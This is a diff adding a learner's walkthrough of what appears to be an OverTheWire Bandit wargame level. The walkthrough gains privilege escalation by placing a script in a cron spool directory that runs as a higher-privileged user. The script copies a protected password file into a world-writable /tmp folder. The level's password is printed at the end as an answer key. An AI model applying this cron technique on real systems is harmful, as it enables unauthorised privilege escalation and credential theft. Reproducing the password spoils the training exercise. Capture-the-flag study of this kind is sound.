@@ -29,6 +29,95 @@ STEPS
 under it.
 12. cp myfirstscript.sh /var/spool/bandit24/foo : copy the script file to the location where the cron job scheduler script will execute it.
 
+This level was **really interesting** because I got to **exploit cron jobs** to retrieve the next password automatically! Here's a **personalized breakdown** of what I did:  
+
+---
+
+### **STEPS**  
+
+1️⃣ **Navigated to the cron job directory:**  
+   ```bash
+   cd /etc/cron.d
+   ```  
+   I wanted to check if there was a scheduled task running as `bandit24`.  
+
+2️⃣ **Listed the files:**  
+   ```bash
+   ls -l
+   ```  
+   This showed me the cron job file managing automated tasks.  
+
+3️⃣ **Checked the cron job script:**  
+   ```bash
+   cat cronjob_bandit23
+   ```  
+   From this, I learned that it runs `/usr/bin/cronjob_bandit23.sh`.  
+
+4️⃣ **Read the script content:**  
+   ```bash
+   cat /usr/bin/cronjob_bandit23.sh
+   ```  
+   It showed that anything placed in `/var/spool/bandit24/` would be executed as `bandit24`!  
+
+---
+
+### **Creating My Own Exploit Script**  
+
+5️⃣ **Changed back to the home directory:**  
+   ```bash
+   cd ~
+   ```  
+
+6️⃣ **Created a temporary directory:**  
+   ```bash
+   mktemp -d
+   ```  
+   This ensured I had a **safe working directory**.  
+
+7️⃣ **Created a file where the password would be stored:**  
+   ```bash
+   touch password
+   ```  
+
+8️⃣ **Opened a text editor to write the script:**  
+   ```bash
+   nano myfirstscript.sh
+   ```  
+
+9️⃣ **Wrote this script inside `myfirstscript.sh`:**  
+   ```bash
+   #!/bin/bash
+   cat /etc/bandit_pass/bandit24 > /tmp/tmp.7XDAdkIYh5/password
+   ```  
+   This script **copies the password** into a file where I can access it.  
+
+🔟 **Saved the file and exited the editor.**  
+
+---
+
+### **Giving My Script Proper Permissions & Execution**  
+
+1️⃣1️⃣ **Made sure my directory and files were accessible:**  
+   ```bash
+   chmod 777 -R /tmp/tmp.7XDAdkIYh5
+   ```  
+   This ensured **any user** (including `bandit24`) could write to the password file.  
+
+1️⃣2️⃣ **Copied my script to the cron job execution directory:**  
+   ```bash
+   cp myfirstscript.sh /var/spool/bandit24/foo
+   ```  
+   Now, when the cron job runs, it **executes my script**, allowing me to retrieve the password from my temporary directory!  
+
+---
+
+### **What I Learned From This Level**  
+- **How cron jobs work** and how to manipulate them.  
+- **Privilege escalation using scheduled tasks.**  
+- **Automating script execution to extract sensitive info.**  
+
+This was a **fun way to understand automation and security risks!**
+
 LEVEL 24 PASSWORD
 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 
